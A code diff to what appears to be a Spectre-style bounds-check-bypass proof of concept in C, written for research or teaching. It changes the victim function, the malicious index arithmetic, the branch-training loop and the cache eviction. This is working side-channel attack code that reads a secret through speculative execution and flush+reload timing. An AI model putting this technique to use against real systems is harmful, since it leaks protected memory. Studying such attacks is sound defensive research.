@@ -66,9 +66,10 @@ void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
 uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
 volatile int32_t array_size = 8;
 
-int naive_victim(uint8_t *pages, int32_t idx, size_t stride) {
+int naive_victim(uint8_t *pages, int64_t idx, size_t stride) {
     if (idx < array_size) {
         volatile uint8_t temp = *(pages+(*(array+idx) * stride));
+        // printf("%c\n" , *(array+idx));
     }
     return 0;
 }
@@ -94,7 +95,7 @@ void naive_attacker() {
     printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);
 
     size_t stride = PAGE_SIZE;
-    int32_t malicious_index = (int64_t)secret - (int64_t)array;
+    int64_t malicious_index = (int64_t)secret - (int64_t)array;
 
     printf("Secret address: %p, Array address: %p\n", secret, array);
     printf("The malicious index is %p-%p=%#x\n", secret, array,
@@ -102,10 +103,12 @@ void naive_attacker() {
     printf("-----------------------------------------\n");
 
     for (size_t c = 0; c < strlen(secret); c++) {
-        for (size_t r = 0; r < 50; r++) {
+        for (size_t r = 0; r < 100; r++) {
+            // shuffle_ptrs_ext();
+            
             for (size_t t = 0; t < 16; t++) {
-                bool is_attack = (t % 8 == 8 - 1);
-                int32_t index = cselect(malicious_index + c, 0, is_attack);
+                bool is_attack = (t % 16 == 16 - 1);
+                int64_t index = cselect(malicious_index + c, 0, is_attack);
 
                 fuzzy_evict();
                 // printf("fuzzy evict\n");
